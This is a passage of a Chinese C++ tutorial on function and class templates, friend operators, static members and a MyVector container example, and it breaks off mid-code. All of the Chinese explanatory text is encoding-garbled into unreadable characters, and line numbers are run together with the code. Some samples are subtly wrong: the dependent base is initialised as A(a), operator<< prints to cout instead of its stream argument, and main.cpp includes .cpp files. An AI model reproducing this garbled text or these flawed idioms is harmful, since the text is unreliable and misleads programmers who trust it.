å½“å‡½æ•°æ¨¡æ¿å’Œæ™®é€šå‡½æ•°éƒ½ç¬¦åˆè°ƒç”¨æ—¶,ä¼˜å…ˆé€‰æ‹©æ™®é€šå‡½æ•° cout &lt;&lt; Max&lt;&gt;(a, b) &lt;&lt; endl; // é€šè¿‡ç©ºæ¨¡æ¿å®å‚åˆ—è¡¨çš„è¯­æ³•ï¼Œå¯ä»¥é™åˆ¶ç¼–è¯‘å™¨åªä½¿ç”¨å‡½æ•°æ¨¡æ¿åŒ¹é… cout &lt;&lt; Max(3.0, 4.0) &lt;&lt; endl; // å¦‚æœå‡½æ•°æ¨¡æ¿äº§ç”Ÿæ›´å¥½çš„åŒ¹é… ä½¿ç”¨å‡½æ•°æ¨¡æ¿ cout &lt;&lt; Max(5.0, 6.0, 7.0) &lt;&lt; endl; // å‡½æ•°æ¨¡æ¿çš„é‡è½½ cout &lt;&lt; Max(\'a\', 100) &lt;&lt; endl; // è°ƒç”¨æ™®é€šå‡½æ•°ï¼Œå¯ä»¥è¿›è¡Œéšå¼ç±»å‹è½¬æ¢ return;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 123456789101112int Max(int a, int b)2T Max(T a, T b)2T Max(T a, T b)4T Max(T a, T b, T c)T Max(T a, T b)T Max(T a, T b)7int Max(int a, int b)100 å‡½æ•°æ¨¡æ¿åº•å±‚åŸç†å‰–æ ç¼–è¯‘å™¨å¹¶ä¸æ˜¯æ ¹æ®å‡½æ•°æ¨¡æ¿ï¼Œäº§ç”Ÿèƒ½å¤Ÿå¤„ç†ä»»æ„å‚æ•°çš„å‡½æ•° ç¼–è¯‘å™¨æœ¬è´¨ä¸Šæ˜¯æ ¹æ®å…·ä½“çš„è°ƒç”¨ç±»å‹ï¼Œä»å‡½æ•°æ¨¡æ¿äº§ç”Ÿä¸åŒçš„å‡½æ•° ç¼–è¯‘å™¨ä¼šå¯¹å‡½æ•°æ¨¡æ¿è¿›è¡Œä¸¤æ¬¡ç¼–è¯‘ï¼Œåœ¨å£°æ˜çš„åœ°æ–¹å¯¹å‡½æ•°æ¨¡æ¿ä»£ç æœ¬èº«è¿›è¡Œç¬¬ä¸€æ¬¡ç¼–è¯‘ï¼Œåœ¨è°ƒç”¨çš„åœ°æ–¹å¯¹å‚æ•°æ›¿æ¢åçš„å‡½æ•°æ¨¡æ¿ä»£ç è¿›è¡Œç¬¬äºŒæ¬¡ç¼–è¯‘ ç±»æ¨¡æ¿ç±»æ¨¡æ¿ä¸å‡½æ•°æ¨¡æ¿çš„å®šä¹‰å’Œä½¿ç”¨ç±»ä¼¼ï¼Œåœ¨å®é™…é¡¹ç›®å¼€å‘ä¸­ï¼Œç»å¸¸æœ‰ä¸¤ä¸ªæˆ–å¤šä¸ªç±»ï¼Œå…¶åŠŸèƒ½æ˜¯ç›¸åŒçš„ï¼Œä»…ä»…æ˜¯æ•°æ®ç±»å‹ä¸åŒï¼Œä¸ºäº†ä¸é‡å¤å®šä¹‰åŠŸèƒ½ç›¸åŒçš„ç±»ï¼Œå¯ä»¥ä½¿ç”¨ç±»æ¨¡æ¿æ¥è§£å†³è¿™ç±»é—®é¢˜ã€‚ ç±»æ¨¡æ¿çš„å®šä¹‰ ç±»æ¨¡æ¿ç”¨äºå®ç°ç±»æ‰€éœ€æ•°æ®çš„ç±»å‹å‚æ•°åŒ– ç±»æ¨¡æ¿åœ¨è¡¨ç¤ºå¦‚æ•°ç»„ã€è¡¨ã€å›¾ç­‰æ•°æ®ç»“æ„æ˜¾å¾—ç‰¹åˆ«é‡è¦ï¼Œè¿™äº›æ•°æ®ç»“æ„çš„è¡¨ç¤ºå’Œç®—æ³•ä¸å—æ‰€åŒ…å«çš„å…ƒç´ ç±»å‹çš„å½±å“ åœ¨ä¸‹è¿°çš„æ‰€æœ‰ä»£ç ä¸­ï¼Œtemplate &lt;typename T&gt; ç­‰ä»·äº template &lt;class T&gt; ç±»æ¨¡æ¿çš„ç®€å•ä½¿ç”¨å€¼å¾—ä¸€æçš„æ˜¯ï¼Œåœ¨ç±»æ¨¡æ¿ä¸­å¦‚æœä½¿ç”¨äº†æ„é€ å‡½æ•°ï¼Œåˆ™å¿…é¡»éµå®ˆ C++ ç±»çš„æ„é€ å‡½æ•°çš„è°ƒç”¨è§„åˆ™ 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;iostream&gt;using namespace std;// æ¨¡æ¿å£°æ˜template &lt;typename T&gt;// ç±»å®šä¹‰class A {public: A(T t) { this-&gt;t = t; } T&amp; getT() { return this-&gt;t; }private: T t;};// ç±»æ¨¡æ¿åšå‡½æ•°å‚æ•°void printA(A&lt;int&gt;&amp; a) { cout &lt;&lt; a.getT() &lt;&lt; endl;}int main() { A&lt;int&gt; a(100); // æ¨¡æ¿ç±»æ˜¯æŠ½è±¡çš„ï¼Œéœ€è¦å£°æ˜å…·ä½“çš„ç±»å‹ï¼ˆæ¨¡æ¿å‚æ•°åˆ—è¡¨ï¼‰ï¼Œè¿™é‡Œçš„ &lt;int&gt; ä¸èƒ½çœç•¥ cout &lt;&lt; a.getT() &lt;&lt; endl; A&lt;int&gt; a2(50); printA(a2); return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 1210050 ç±»æ¨¡æ¿ä¸æ´¾ç”Ÿç±»çš„ä½¿ç”¨æ™®é€šç±»ç»§æ‰¿ç±»æ¨¡æ¿åœ¨ C++ ä¸­ï¼Œç±»æ¨¡æ¿å¯ä»¥è¢«æ™®é€šç±»ç»§æ‰¿ï¼Œæ™®é€šç±»ç»§æ‰¿ç±»æ¨¡æ¿æ—¶ï¼Œéœ€è¦å£°æ˜çˆ¶ç±»å…·ä½“çš„æ•°æ®ç±»å‹ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;iostream&gt;using namespace std;// æ¨¡æ¿å£°æ˜template &lt;typename T&gt;// ç±»å®šä¹‰class A {public: A(T a) { this-&gt;a = a; } T&amp; getA() { return this-&gt;a; }public: T a;};// æ™®é€šç±»ç»§æ‰¿ç±»æ¨¡æ¿ï¼Œéœ€è¦å£°æ˜å…·ä½“çš„ç±»å‹ï¼ˆæ¨¡æ¿å‚æ•°åˆ—è¡¨ï¼‰ï¼Œè¿™é‡Œçš„ &lt;int&gt; ä¸èƒ½çœç•¥class B : public A&lt;int&gt; {public: B(int a, int b) : A&lt;int&gt;(a) { this-&gt;b = b; } void printB() { cout &lt;&lt; "a = " &lt;&lt; a &lt;&lt; ", b = " &lt;&lt; b &lt;&lt; endl; }public: int b;};int main() { A&lt;int&gt; a(100); cout &lt;&lt; a.getA() &lt;&lt; endl; B b(1, 3); b.printB(); return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 12100a = 1, b = 3 ç±»æ¨¡æ¿ç»§æ‰¿ç±»æ¨¡æ¿12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &lt;iostream&gt;using namespace std;// æ¨¡æ¿å£°æ˜template &lt;typename T&gt;// ç±»å®šä¹‰class A {public: A(T a) { this-&gt;a = a; } T&amp; getA() { return this-&gt;a; }public: T a;};// æ¨¡æ¿å£°æ˜template &lt;typename T&gt;// ç±»æ¨¡æ¿ç»§æ‰¿ç±»æ¨¡æ¿class B : public A&lt;T&gt; {public: B(T a, T b) : A(a) { this-&gt;b = b; } T&amp; getB() { return this-&gt;b; }private: T b;};int main() { A&lt;int&gt; a(3); cout &lt;&lt; a.getA() &lt;&lt; endl; B&lt;double&gt; b(3.2, 4.5); cout &lt;&lt; b.getA() &lt;&lt; endl; cout &lt;&lt; b.getB() &lt;&lt; endl; return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 12333.24.5 ç±»æ¨¡æ¿å‡½æ•°çš„ä¸‰ç§å†™æ³•å€¼å¾—ä¸€æçš„æ˜¯ï¼Œä¼ä¸šé¡¹ç›®å¼€å‘ä¸­ï¼Œå»ºè®®ä½¿ç”¨ç¬¬ä¸€ç§æˆ–è€…ç¬¬ä¸‰ç§æ–¹å¼ï¼ŒSTL åº“ä¸€èˆ¬éƒ½é‡‡ç”¨ç¬¬ä¸€ç§æ–¹å¼ã€‚ æ‰€æœ‰çš„ç±»æ¨¡æ¿å‡½æ•°å†™åœ¨ç±»çš„å†…éƒ¨ï¼ˆç¬¬ä¸€ç§ï¼‰12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#include &lt;iostream&gt;using namespace std;template &lt;typename T&gt;class Complex {public: // æ„é€ å‡½æ•° Complex(T a, T b) { this-&gt;a = a; this-&gt;b = b; } // ç±»æˆå‘˜å‡½æ•° void print() { cout &lt;&lt; "a = " &lt;&lt; this-&gt;a &lt;&lt; ", b = " &lt;&lt; this-&gt;b &lt;&lt; endl; } // ç±»æˆå‘˜å‡½æ•°ï¼Œé‡è½½è¿ç®—ç¬¦ "+" Complex operator+(Complex&amp; c2) { Complex tmp(this-&gt;a + c2.a, this-&gt;b + c2.b); return tmp; } // å‹å…ƒå‡½æ•°ï¼Œé‡è½½è¿ç®—ç¬¦ "&lt;&lt;" friend ostream&amp; operator&lt;&lt;(ostream&amp; out, Complex&amp; c1) { cout &lt;&lt; "a = " &lt;&lt; c1.a &lt;&lt; ", b = " &lt;&lt; c1.b; return out; } // å‹å…ƒå‡½æ•° friend Complex sub(Complex&amp; c1, Complex&amp; c2) { Complex tmp(c1.a - c2.a, c1.b - c2.b); return tmp; }private: T a; T b;};int main() { Complex&lt;int&gt; c1(1, 4); Complex&lt;int&gt; c2(3, 6); c1.print(); c2.print(); Complex&lt;int&gt; c3 = c1 + c2; cout &lt;&lt; c3 &lt;&lt; endl; Complex&lt;int&gt; c4 = sub(c1, c2); cout &lt;&lt; c4 &lt;&lt; endl; return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 1234a = 1, b = 4a = 3, b = 6a = 4, b = 10a = -2, b = -2 æ‰€æœ‰çš„ç±»æ¨¡æ¿å‡½æ•°å†™åœ¨ç±»çš„å¤–éƒ¨ï¼ˆç¬¬äºŒç§ï¼‰æ‰€æœ‰çš„ç±»æ¨¡æ¿å‡½æ•°å†™åœ¨ç±»çš„å¤–éƒ¨ï¼ˆå†™åœ¨åŒä¸€ä¸ª .cpp æ–‡ä»¶ï¼‰ï¼Œå½“ä½¿ç”¨å‹å…ƒå‡½æ•°é‡è½½äº† &lt;&lt;ã€&gt;&gt; è¿ç®—ç¬¦æ—¶ï¼Œéœ€è¦ç‰¹åˆ«æ³¨æ„å£°æ˜å‹å…ƒå‡½æ•°çš„å†™æ³• friend ostream&amp; operator&lt;&lt; &lt;T&gt;(ostream&amp; out, Complex&amp; c1);ã€‚ç‰¹åˆ«æ³¨æ„ï¼Œé™¤äº†é‡è½½è¿ç®—ç¬¦ &lt;&lt;ã€&gt;&gt; å¿…é¡»ä½¿ç”¨å‹å…ƒå‡½æ•°ä¹‹å¤–ï¼Œå…¶ä»–è¿ç®—ç¬¦çš„é‡è½½å°½é‡éƒ½ä½¿ç”¨ç±»æˆå‘˜å‡½æ•°ã€‚åƒä¸‡ä¸è¦æ»¥ç”¨å‹å…ƒå‡½æ•°ï¼Œå°¤å…¶ç±»æ¨¡æ¿ä¸å‹å…ƒå‡½æ•°ä¸€èµ·ä½¿ç”¨çš„æ—¶å€™ï¼Œè¿™æ˜¯å› ä¸ºéœ€è¦ä½¿ç”¨æ€ªå¼‚çš„è¯­æ³•æ¥è§£å†³ C++ ç¼–è¯‘å™¨å‡ºç°çš„é”™è¯¯ï¼Œä¸”ä¸åŒçš„ C++ ç¼–è¯‘å™¨è¡¨ç°è¡Œä¸ºä¸ä¸€å®šä¸€è‡´ã€‚å‡è®¾åœ¨ç±»æ¨¡æ¿ä¸­æ»¥ç”¨äº†å‹å…ƒå‡½æ•°ï¼Œè§£å†³ C++ ç¼–è¯‘é—®é¢˜çš„è¯­æ³•è¯¦è§ å›¾è§£åˆ†æã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081#include &lt;iostream&gt;using namespace std;/********** START è§£å†³ç±»æ¨¡æ¿ä¸å‹å…ƒå‡½æ•°æ»¥ç”¨ï¼ˆéé‡è½½å·¦ç§»ä¸å³ç§»è¿ç®—ç¬¦ï¼‰æ—¶å‡ºç°çš„ç¼–è¯‘é—®é¢˜ *********/template &lt;typename T&gt; class Complex;template &lt;typename T&gt; Complex&lt;T&gt; sub(Complex&lt;T&gt;&amp; c1, Complex&lt;T&gt;&amp; c2);/********** END è§£å†³ç±»æ¨¡æ¿ä¸å‹å…ƒå‡½æ•°æ»¥ç”¨ï¼ˆéé‡è½½å·¦ç§»ä¸å³ç§»è¿ç®—ç¬¦ï¼‰æ—¶å‡ºç°çš„ç¼–è¯‘é—®é¢˜ *********/template &lt;typename T&gt;class Complex {public: // æ„é€ å‡½æ•° Complex(T a, T b); // ç±»æˆå‘˜å‡½æ•° void print(); // ç±»æˆå‘˜å‡½æ•°ï¼Œé‡è½½è¿ç®—ç¬¦ "+" Complex operator+(Complex&amp; c2); // å‹å…ƒå‡½æ•°ï¼ˆæ»¥ç”¨å‹å…ƒå‡½æ•°ï¼‰ friend Complex sub&lt;T&gt;(Complex&amp; c1, Complex&amp; c2); // å‹å…ƒå‡½æ•°ï¼Œé‡è½½è¿ç®—ç¬¦ "&lt;&lt;" friend ostream&amp; operator&lt;&lt; &lt;T&gt;(ostream&amp; out, Complex&amp; c1);private: T a; T b;};// æ„é€ å‡½æ•°template &lt;typename T&gt;Complex&lt;T&gt;::Complex(T a, T b) { this-&gt;a = a; this-&gt;b = b;}// ç±»æˆå‘˜å‡½æ•°template &lt;typename T&gt;void Complex&lt;T&gt;::print() { cout &lt;&lt; "a = " &lt;&lt; this-&gt;a &lt;&lt; ", b = " &lt;&lt; this-&gt;b &lt;&lt; endl;}// ç±»æˆå‘˜å‡½æ•°ï¼Œé‡è½½è¿ç®—ç¬¦ "+"template &lt;typename T&gt;Complex&lt;T&gt; Complex&lt;T&gt;::operator+(Complex&lt;T&gt;&amp; c2) { Complex&lt;T&gt; tmp(this-&gt;a + c2.a, this-&gt;b + c2.b); return tmp;}// å‹å…ƒå‡½æ•°ï¼Œé‡è½½è¿ç®—ç¬¦ "&lt;&lt;"template &lt;typename T&gt;ostream&amp; operator&lt;&lt;(ostream&amp; out, Complex&lt;T&gt;&amp; c1) { cout &lt;&lt; "a = " &lt;&lt; c1.a &lt;&lt; ", b = " &lt;&lt; c1.b; return out;}// å‹å…ƒå‡½æ•°ï¼ˆæ»¥ç”¨å‹å…ƒå‡½æ•°ï¼‰template &lt;typename T&gt;Complex&lt;T&gt; sub(Complex&lt;T&gt;&amp; c1, Complex&lt;T&gt;&amp; c2) { Complex&lt;T&gt; tmp(c1.a - c2.a, c1.b - c2.b); return tmp;}int main() { Complex&lt;int&gt; c1(3, 8); Complex&lt;int&gt; c2(9, 5); c1.print(); c2.print(); Complex&lt;int&gt; c3 = c1 + c2; cout &lt;&lt; c3 &lt;&lt; endl; Complex&lt;int&gt; c4 = sub(c1, c2); cout &lt;&lt; c4 &lt;&lt; endl; return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 1234a = 3, b = 8a = 9, b = 5a = 12, b = 13a = -6, b = 3 æ‰€æœ‰çš„ç±»æ¨¡æ¿å‡½æ•°å†™åœ¨ç±»çš„å¤–éƒ¨ï¼ˆç¬¬ä¸‰ç§ï¼‰æ‰€æœ‰çš„ç±»æ¨¡æ¿å‡½æ•°å†™åœ¨ç±»çš„å¤–éƒ¨ï¼ˆåˆ†å¼€å†™åœ¨ .h å’Œ .cpp ä¸­ï¼‰ï¼Œè¿™é‡Œé™¤äº†é‡è½½è¿ç®—ç¬¦ &lt;&lt;ã€&gt;&gt; å¿…é¡»ä½¿ç”¨å‹å…ƒå‡½æ•°ä¹‹å¤–ï¼Œåƒä¸‡ä¸è¦æ»¥ç”¨å‹å…ƒå‡½æ•°ï¼›å› ä¸º C++ ç¼–è¯‘å™¨ä¼šå‡ºç°ç¼–è¯‘é”™è¯¯ï¼Œä¸”æ²¡æœ‰å¾ˆå¥½çš„è§£å†³æ–¹æ³•ã€‚ complex.h 123456789101112131415161718192021#pragma once#include &lt;iostream&gt;using namespace std;template &lt;typename T&gt;class Complex {public: Complex(T a, T b); void print(); Complex operator+(Complex&amp; c2); friend ostream&amp; operator&lt;&lt; &lt;T&gt;(ostream&amp; out, Complex&amp; c1);private: T a; T b;}; complex.hppï¼Œè¿™é‡Œçš„ .hpp æ–‡ä»¶ä¸ .cpp æ–‡ä»¶æœ¬è´¨ä¸Šæ²¡æœ‰åŒºåˆ«ï¼Œä¸ºäº†æ–¹ä¾¿åŒºåˆ†æ„å›¾ï¼Œåªæ˜¯æ–‡ä»¶çš„åç¼€ä¸ä¸€æ ·è€Œå·² 12345678910111213141516171819202122232425262728#include "complex.h"// æ„é€ å‡½æ•°template &lt;typename T&gt;Complex&lt;T&gt;::Complex(T a, T b) { this-&gt;a = a; this-&gt;b = b;}// ç±»æˆå‘˜å‡½æ•°template &lt;typename T&gt;void Complex&lt;T&gt;::print() { cout &lt;&lt; "a = " &lt;&lt; this-&gt;a &lt;&lt; ", b = " &lt;&lt; this-&gt;b &lt;&lt; endl;}// ç±»æˆå‘˜å‡½æ•°ï¼Œé‡è½½è¿ç®—ç¬¦ "+"template &lt;typename T&gt;Complex&lt;T&gt; Complex&lt;T&gt;::operator+(Complex&lt;T&gt;&amp; c2) { Complex&lt;T&gt; tmp(this-&gt;a + c2.a, this-&gt;b + c2.b); return tmp;}// å‹å…ƒå‡½æ•°ï¼Œé‡è½½è¿ç®—ç¬¦ "&lt;&lt;"template &lt;typename T&gt;ostream&amp; operator&lt;&lt;(ostream&amp; out, Complex&lt;T&gt;&amp; c1) { cout &lt;&lt; "a = " &lt;&lt; c1.a &lt;&lt; ", b = " &lt;&lt; c1.b; return out;} main.cppï¼Œç‰¹åˆ«æ³¨æ„ï¼Œè¿™é‡Œå¼•å…¥çš„æ˜¯ .hpp æˆ–è€… .cpp æ–‡ä»¶ï¼Œè€Œä¸æ˜¯ .h å¤´æ–‡ä»¶ï¼Œå¦åˆ™ C++ ç¼–è¯‘å™¨ä¼šç¼–è¯‘å¤±è´¥ 12345678910111213#include "complex.hpp"int main() { Complex&lt;int&gt; c1(6, 13); Complex&lt;int&gt; c2(23, 34); c1.print(); c2.print(); Complex&lt;int&gt; c3 = c1 + c2; cout &lt;&lt; c3 &lt;&lt; endl; return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 123a = 6, b = 13a = 23, b = 34a = 29, b = 47 ç±»æ¨¡æ¿ä¸­çš„ static å…³é”®å­— ä»ç±»æ¨¡æ¿å®ä¾‹åŒ–çš„æ¯ç§æ•°æ®ç±»å‹æ¨¡æ¿ç±»éƒ½æœ‰è‡ªå·±çš„ç±»æ¨¡æ¿æ•°æ®æˆå‘˜ï¼Œè¯¥æ•°æ®ç±»å‹çš„æ¨¡æ¿ç±»çš„æ‰€æœ‰å¯¹è±¡å…±äº«åŒä¸€ä¸ª static æ•°æ®æˆå‘˜ å’Œéæ¨¡æ¿ç±»çš„ static æ•°æ®æˆå‘˜ä¸€æ ·ï¼Œæ¨¡æ¿ç±»çš„ static æ•°æ®æˆå‘˜ä¹Ÿåº”è¯¥åœ¨æºæ–‡ä»¶èŒƒå›´å†…å®šä¹‰å’Œåˆå§‹åŒ– æ¯ç§æ•°æ®ç±»å‹çš„æ¨¡æ¿ç±»éƒ½æœ‰è‡ªå·±å•ç‹¬ä¸€ä»½çš„ç±»æ¨¡æ¿çš„ static æ•°æ®æˆå‘˜å‰¯æœ¬ï¼Œè¯¦è§ å›¾è§£åˆ†æ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#include &lt;iostream&gt;using namespace std;const double pi = 3.14;template &lt;typename T&gt; class Circle {public: Circle(T radius = 0) { this-&gt;m_radius = radius; this-&gt;m_total++; } void setRadius(T radius) { this-&gt;m_radius = radius; } T getRadius() { return this-&gt;m_radius; } double getGirth() { return 2 * pi * this-&gt;m_radius; } double getArea() { return pi * this-&gt;m_radius * this-&gt;m_radius; } // ç±»æ¨¡æ¿çš„é™æ€æˆå‘˜å‡½æ•° static int getTotal() { return m_total; }private: T m_radius; // ç±»æ¨¡æ¿çš„é™æ€æ•°æ®æˆå‘˜ static int m_total;};// åˆå§‹åŒ–ç±»æ¨¡æ¿çš„é™æ€æ•°æ®æˆå‘˜template &lt;typename T&gt; int Circle&lt;T&gt;::m_total = 0;int main() { // æ¯ç§æ•°æ®ç±»å‹çš„æ¨¡æ¿ç±»éƒ½æœ‰è‡ªå·±å•ç‹¬ä¸€ä»½çš„ç±»æ¨¡æ¿çš„ static æ•°æ®æˆå‘˜å‰¯æœ¬ Circle&lt;int&gt; c1(4), c2(6); cout &lt;&lt; "m_total = " &lt;&lt; Circle&lt;int&gt;::getTotal() &lt;&lt; endl; cout &lt;&lt; "radius = " &lt;&lt; c1.getRadius() &lt;&lt; ", girth = " &lt;&lt; c1.getGirth() &lt;&lt; ", area = " &lt;&lt; c1.getArea() &lt;&lt; endl; cout &lt;&lt; "radius = " &lt;&lt; c2.getRadius() &lt;&lt; ", girth = " &lt;&lt; c2.getGirth() &lt;&lt; ", area = " &lt;&lt; c2.getArea() &lt;&lt; endl; Circle&lt;float&gt; c3(3.2), c4(4.3), c5(6.2); cout &lt;&lt; "m_total = " &lt;&lt; Circle&lt;float&gt;::getTotal() &lt;&lt; endl; cout &lt;&lt; "radius = " &lt;&lt; c3.getRadius() &lt;&lt; ", girth = " &lt;&lt; c3.getGirth() &lt;&lt; ", area = " &lt;&lt; c3.getArea() &lt;&lt; endl; cout &lt;&lt; "radius = " &lt;&lt; c4.getRadius() &lt;&lt; ", girth = " &lt;&lt; c4.getGirth() &lt;&lt; ", area = " &lt;&lt; c4.getArea() &lt;&lt; endl; cout &lt;&lt; "radius = " &lt;&lt; c5.getRadius() &lt;&lt; ", girth = " &lt;&lt; c5.getGirth() &lt;&lt; ", area = " &lt;&lt; c5.getArea() &lt;&lt; endl; return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 1234567m_total = 2radius = 4, girth = 25.12, area = 50.24radius = 6, girth = 37.68, area = 113.04m_total = 3radius = 3.2, girth = 20.096, area = 32.1536radius = 4.3, girth = 27.004, area = 58.0586radius = 6.2, girth = 38.936, area = 120.702 æ•°ç»„æ¨¡æ¿ç±»çš„å®æˆ˜æ¡ˆä¾‹ä¸‹é¢å°†ç¼–å†™æ•°ç»„æ¨¡æ¿ç±»ï¼Œæ¨¡æ‹Ÿ STL å®¹å™¨çš„å®ç°ï¼ŒåŒæ—¶è´¯ç©¿ä¸Šé¢æ‰€è®²çš„ C++ æ¨¡æ¿çŸ¥è¯†ç‚¹ã€‚ â˜…ç‚¹å‡»æ˜¾ç¤ºå®Œæ•´çš„æ¡ˆä¾‹ä»£ç â˜… MyVector.h 123456789101112131415161718192021222324252627#pragma once#include &lt;iostream&gt;using namespace std;template &lt;class T&gt;class MyVector {public: MyVector(int size = 0); ~MyVector(); MyVector(const MyVector&amp; obj);public: int getSize();public: T&amp; operator[](int index); MyVector&amp; operator=(const MyVector&amp; obj); friend ostream&amp; operator&lt;&lt; &lt;T&gt;(ostream&amp; out, MyVector&amp; obj);private: T* m_space; // æŒ‡å‘æ•°ç»„çš„æŒ‡é’ˆ int m_size;}; MyVector.hpp 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#include "MyVector.h"// æ„é€ å‡½æ•°template &lt;typename T&gt;MyVector&lt;T&gt;::MyVector(int size) { this-&gt;m_size = size; // åˆ†é…å†…å­˜ç©ºé—´ this-&gt;m_space = new T[size];}// ææ„å‡½æ•°template &lt;typename T&gt;MyVector&lt;T&gt;::~MyVector() { if (this-&gt;m_space) { // é‡Šæ”¾å†…å­˜ç©ºé—´ delete[] this-&gt;m_space; this-&gt;m_size = 0; this-&gt;m_space = NULL; }}// æ‹·è´æ„é€ å‡½æ•°template &lt;typename T&gt;MyVector&lt;T&gt;::MyVector(const MyVector&lt;T&gt;&amp; obj) { // æ·±æ‹·è´ this-&gt;m_size = obj.m_size; this-&gt;m_space = new T[obj.m_size]; for (int i = 0; i &lt; obj.m_size; i++) { this-&gt;m_space[i] = obj.m_space[i]; }}// æ™®é€šç±»æˆå‘˜å‡½æ•°template &lt;typename T&gt;int MyVector&lt;T&gt;::getSize() { return this-&gt;m_size;}// ä½¿ç”¨ç±»æˆå‘˜å‡½æ•°ï¼Œé‡è½½è¿ç®—ç¬¦ "[]"template &lt;typename T&gt;T&amp; MyVector&lt;T&gt;::operator[](int index) { return this-&gt;m_space[index];}// ä½¿ç”¨ç±»æˆå‘˜å‡½æ•°ï¼Œé‡è½½è¿ç®—ç¬¦ "="template &lt;typename T&gt;MyVector&lt;T&gt;&amp; MyVector&lt;T&gt;::operator=(const MyVector&lt;T&gt;&amp; obj) { if (this-&gt;m_space) { // é‡Šæ”¾åŸæœ¬çš„å†…å­˜ç©ºé—´ delete[] this-&gt;m_space; this-&gt;m_size = 0; this-&gt;m_space = NULL; } // æ·±æ‹·è´ this-&gt;m_size = obj.m_size; this-&gt;m_space = new T[obj.m_size]; for (int i = 0; i &lt; obj.m_size; i++) { this-&gt;m_space[i] = obj.m_space[i]; } return *this;};// ä½¿ç”¨å‹å…ƒå‡½æ•°ï¼Œé‡è½½è¿ç®—ç¬¦ "&lt;&lt;"template &lt;typename T&gt;ostream&amp; operator&lt;&lt;(ostream&amp; out, MyVector&lt;T&gt;&amp; obj) { for (int i = 0; i &lt; obj.m_size; i++) { cout &lt;&lt; obj.m_space[i] &lt;&lt; ", "; } return out;} Teacher.h 12345678910111213141516171819202122232425262728#pragma once#include &lt;iostream&gt;using namespace std;class Teacher {public: Teacher(); Teacher(int age, const char* name); Teacher(const Teacher&amp; obj); ~Teacher();public: Teacher&amp; operator=(const Teacher&amp; obj); friend ostream&amp; operator&lt;&lt;(ostream&amp; out, Teacher&amp; obj);public: int getAge(); char* getName(); void setAge(int age); void setName(const char* name);private: int m_age; char* m_name;}; Teacher.cpp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#include "Teacher.h"// æ„é€ å‡½æ•°Teacher::Teacher() { this-&gt;m_age = 0; this-&gt;m_name = (char*)malloc(1); if (this-&gt;m_name) { strcpy(this-&gt;m_name, ""); }}// æ„é€ å‡½æ•°Teacher::Teacher(int age, const char* name) { this-&gt;m_age = age; this-&gt;m_name = (char*)malloc(strlen(name) + 1); if (this-&gt;m_name) { strcpy(this-&gt;m_name, name); }}// æ‹·è´æ„é€ å‡½æ•°Teacher::Teacher(const Teacher&amp; obj) { // æ·±æ‹·è´ this-&gt;m_age = obj.m_age; this-&gt;m_name = (char*)malloc(strlen(obj.m_name) + 1); if (this-&gt;m_name) { strcpy(this-&gt;m_name, obj.m_name); }}// ææ„å‡½æ•°Teacher::~Teacher() { if (this-&gt;m_name) { free(this-&gt;m_name); }}// ä½¿ç”¨ç±»æˆå‘˜å‡½æ•°ï¼Œé‡è½½è¿ç®—ç¬¦ "="Teacher&amp; Teacher::operator=(const Teacher&amp; obj) { // é‡Šæ”¾åŸæœ¬çš„å†…å­˜ç©ºé—´ if (this-&gt;m_name) { free(this-&gt;m_name); this-&gt;m_name = NULL; } // æ·±æ‹·è´ this-&gt;m_age = obj.m_age; this-&gt;m_name = (char*)malloc(strlen(obj.m_name) + 1); if (this-&gt;m_name) { strcpy(this-&gt;m_name, obj.m_name); } return *this;}// ä½¿ç”¨å‹å…ƒå‡½æ•°ï¼Œé‡è½½è¿ç®—ç¬¦ "&lt;&lt;"ostream&amp; operator&lt;&lt;(ostream&amp; out, Teacher&amp; obj) { cout &lt;&lt; "age = " &lt;&lt; obj.m_age &lt;&lt; " name = " &lt;&lt; obj.m_name; return out;}int Teacher::getAge() { return this-&gt;m_age;}char* Teacher::getName() { return this-&gt;m_name;}void Teacher::setAge(int age) { this-&gt;m_age = age;}void Teacher::setName(const char* name) { // é‡Šæ”¾åŸæœ¬çš„å†…å­˜ç©ºé—´ if (this-&gt;m_name) { free(this-&gt;m_name); this-&gt;m_name = NULL; } // æ·±æ‹·è´ this-&gt;m_name = (char*)malloc(strlen(name) + 1); if (this-&gt;m_name) { strcpy(this-&gt;m_name, name); }} main.cppï¼Œå€¼å¾—ä¸€æçš„æ˜¯ï¼Œè¿™é‡Œéœ€è¦å¼•å…¥ Teacher.cpp å’Œ MyVector.hppï¼Œè€Œä¸æ˜¯ Teacher.h å’Œ MyVector.h å¤´æ–‡ä»¶ï¼Œå¦åˆ™ C++ ç¼–è¯‘å™¨ä¼šç¼–è¯‘å¤±è´¥ï¼Œæœ¬è´¨åŸå› æ˜¯ç”±äº C++ ç¼–è¯‘å™¨ä¼šå¯¹æ¨¡æ¿è¿›è¡Œä¸¤æ¬¡ç¼–è¯‘å¯¼è‡´çš„ï¼Œè¯¦è§ C++ æ¨¡æ¿çš„ç¼–è¯‘é”™è¯¯åˆ†æã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include "Teacher.cpp"#include "MyVector.hpp"int main() { // è‡ªåŠ¨è°ƒç”¨æ„é€ å‡½æ•° MyVector&lt;int&gt; v(5); // é‡è½½è¿ç®—ç¬¦ "[]" for (int i = 